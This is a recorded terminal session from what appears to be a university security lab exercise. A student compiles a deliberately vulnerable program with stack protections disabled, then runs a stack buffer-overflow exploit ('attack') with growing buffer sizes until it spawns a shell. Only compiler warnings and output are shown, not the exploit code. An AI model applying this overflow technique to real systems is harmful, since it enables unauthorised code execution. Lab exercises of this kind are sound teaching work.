Script started on Mon 07 Mar 2016 08:01:24 PM EST
]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ ^C
]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ [20P(reverse-i-search)`':[Cg': gdb -q ./part2 -tuic': gcc -o BufferRedirect64 BufferRedirect64.c[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@c[C[C[C]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ gcc -o BufferRedirect64 BufferRedirect64.c[23P./BufferRedirect64 gcc -z execstack -o BufferRedirect64 BufferRedirect64.c[3Pfno-stack-protector -o vuln vuln.c[21P[C[C[C[C[C[C[C[C[C[C[C[C[C[21@fno-stack-protector -[C[C[C[C[C[C[C[C[C[C[C[C[C[1P vuln.c[1P vuln.c[1P vuln.c[1P vuln.ca vuln.ct vuln.ct vuln.ca vuln.cc vuln.ck vuln.c[C[1Puln.c[1Pln.c[1Pn.c[1P.ca.ct.ct.ca.cc.ck.c
attack.c: In function â€˜mainâ€™:
attack.c:19:7: warning: incompatible implicit declaration of built-in function â€˜exitâ€™ [enabled by default]
       exit(0);
       ^
attack.c:23:14: warning: incompatible implicit declaration of built-in function â€˜mallocâ€™ [enabled by default]
       buff = malloc(bsize); 
              ^
attack.c:24:12: warning: assignment makes pointer from integer without a cast [enabled by default]
       addr = get_sp() -offset;
            ^
attack.c:25:7: warning: format â€˜%xâ€™ expects argument of type â€˜unsigned intâ€™, but argument 2 has type â€˜long long int *â€™ [-Wformat=]
       printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
       ^
attack.c:31:18: warning: assignment makes integer from pointer without a cast [enabled by default]
       *(addr_ptr)=addr;
                  ^
attack.c:36:23: warning: assignment makes integer from pointer without a cast [enabled by default]
       buff[bsize - 1] = (char*)NULL; 
                       ^
]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ ./attack 100 12000

Using address as guess for beginning of attack buffer: 0xffffb020

Length of Input String:99


Value of Test:ffffb7d8
Value of filename[0]:ffffb3d0

You are going to need a buffer a little larger than:1032

]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ ./attack 100 12000[1P 12000

Using address as guess for beginning of attack buffer: 0xffffb020

Length of Input String:9


Value of Test:ffffb838
Value of filename[0]:ffffb430

You are going to need a buffer a little larger than:1032

]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ ./attack 10 120003 120002 12000

Using address as guess for beginning of attack buffer: 0xffffb020

Length of Input String:1030


Value of Test:ffffb438
Value of filename[0]:ffffb030

You are going to need a buffer a little larger than:1032

]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ ./attack 1032 12000[1P 12000[1P 120004 120000 12000

Using address as guess for beginning of attack buffer: 0xffffb020

Length of Input String:1038


Value of Test:ffffb438
Value of filename[0]:ffffb030

You are going to need a buffer a little larger than:1032

]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ ./attack 1040 12000[1P 120008 12000

Using address as guess for beginning of attack buffer: 0xffffb020

Length of Input String:1046


Value of Test:ffffb428
Value of filename[0]:ffffb020

You are going to need a buffer a little larger than:1032

Segmentation fault (core dumped)
]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ ./attack 1048 12000[K[K16

Using address as guess for beginning of attack buffer: 0xffffb010

Length of Input String:1046


Value of Test:ffffb428
Value of filename[0]:ffffb020

You are going to need a buffer a little larger than:1032

$ ls
BufferRedirect64	  BufferRedirectViaStack64.c   Part3aDemo.txt	attack	       part.s	part1.s~  part2.s~
BufferRedirect64.c	  BufferRedirectViaStack64.c~  Part3aDemo2.txt	attack.c       part1	part2	  vuln
BufferRedirect64.c~	  Part1Demo.txt		       Part3bDemo.txt	attack.c~      part1.o	part2.o   vuln.c
BufferRedirectViaStack64  Part2Demo.txt		       Part4Demo.txt	bytecode.txt~  part1.s	part2.s   vuln.c~
$ exit
]0;seclab@SecurityLabUbuntu64: ~/Assignmentsseclab@SecurityLabUbuntu64:~/Assignments$ exit
Script done on Mon 07 Mar 2016 08:02:59 PM EST
